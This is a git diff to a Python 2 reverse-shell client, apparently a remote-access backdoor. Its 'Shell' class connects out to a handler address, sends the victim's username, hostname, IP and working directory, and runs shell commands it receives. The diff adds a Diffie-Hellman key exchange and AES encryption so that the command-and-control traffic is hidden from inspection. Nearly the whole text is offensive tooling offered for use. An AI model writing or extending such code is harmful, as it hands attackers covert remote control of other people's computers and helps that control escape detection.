@@ -1,9 +1,10 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, win32api, datetime, getpass, time
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random
+from Crypto.Cipher import AES
 
 def windows_only(func):
 	def tester(junk):
-		if os.name != "nt": return "I'm afraid I cannot let you do that Dave."
+		if os.name != "nt": return "Command not available on non-windows OS."
 	return tester
 
 class Shell:
@@ -15,13 +16,43 @@ class Shell:
 		
 		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
 		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
+		
+	def gen_diffie_key(self):
+		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
+		base = 2
+		
+		private_key = random.randint(10**(255), (10**256)-1)
+		public_key = pow(base, private_key, modulus)
+		
+		self.comm_socket.sendall(str(public_key))
+		server_key = self.comm_socket.recv(4096)
+		
+		sharedSecret = pow(int(server_key), private_key, modulus)
+		
+		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
+		key = hash[:32]
+		IV = hash[-16:]
+		
+		print key, IV
+	
+		return key, IV
+		
+	def encrypt(self, data):
+		return base64.b64encode(self.aes_obj.encrypt(data))
+		
+	def decrypt(self, data):
+		return self.aes_obj.decrypt(base64.b64decode(data))
 
 	def connect(self):
 		self.comm_socket.connect((self.handler_ip, self.handler_port))
 		
+		key, IV = self.gen_diffie_key()
+		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
+		
 	def get_data(self):
 		data = self.comm_socket.recv(4096)
 		if not data: raise Exception("Handler disconnected")
+		data = self.decrypt(data)
 		return data
 		
 	def set_package_items(self, items):
@@ -56,6 +87,7 @@ class Shell:
 
 	def send_data(self, data):
 		data_package = self.package(data)
+		data_package = self.encrypt(data_package)
 		self.comm_socket.sendall(data_package)
 		
 	def execute_shell_command(self, command):
